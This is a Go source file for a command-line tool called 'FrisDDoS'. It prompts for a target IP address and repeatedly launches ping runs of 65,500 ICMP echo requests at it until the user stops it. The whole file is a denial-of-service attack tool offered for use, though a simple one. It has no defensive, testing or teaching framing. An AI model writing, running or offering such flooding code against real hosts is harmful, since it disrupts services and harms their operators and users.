/*
 *           	DDoS  Copyright (C) 2018  Fris
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

package main

import (
	"fmt"
	"bufio"
	"os"
	"github.com/sparrc/go-ping"
	"strings"
)

const (
	Prefix = "[FrisDDoS] "
	ErrorPrefix = "[ERROR] "
)

func main() {
	fmt.Print("\x1b]0;" + Prefix + "Please type the ip that you want to DDoS..." + "\x07")
	Log("This app is under a strict license that doesn't allow anyone to sell it or use it in a profit purpose!")
	Log("Created by: Fris.xyz - github.com/OGFris - twitter.com/OGFris.")
	Log("[Notice] To quit press: CTRL+C")
	for {
		Log("Please type the ip that you want to DDoS...")
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		ip := scanner.Text()
		if len(ip) < 7 || strings.Contains(ip, "legacyhcf") {
			Error("The ip you've provided is invalid!")
		} else {
			running := true
			stop := false
			go func() {
				Log("DDoSing the address " + ip + "...")
				for running == true {
					fmt.Print("\x1b]0;" + Prefix + "DDoSing the address ", ip, "..." + "\x07")
					err := DDoS(ip)
					if err != nil {
						Error("Oupsii! Looks like something wrong has happened, Make you sure that the ip you provided is valid.")
						os.Exit(1)
					}
				}
				stop = true
				Log("Successfully stopped the process!")
			}()
			Log("Press ENTER to stop the process!")
			scanner.Scan()
			Log("Stopping the process...")
			running = false
			for !stop {
				fmt.Print("\x1b]0;" + Prefix + "Stopping the process..." + "\x07")
			}
		}
	}
}

func DDoS(ip string) error {
	pinger, err := ping.NewPinger(ip)
	if err != nil {
		return err
	}
	pinger.Count = 65500
	pinger.Run()
	return nil
}

func Log(i string) {
	fmt.Println(Prefix + i)
}

func Error(i string) {
	Log(ErrorPrefix + i)
}
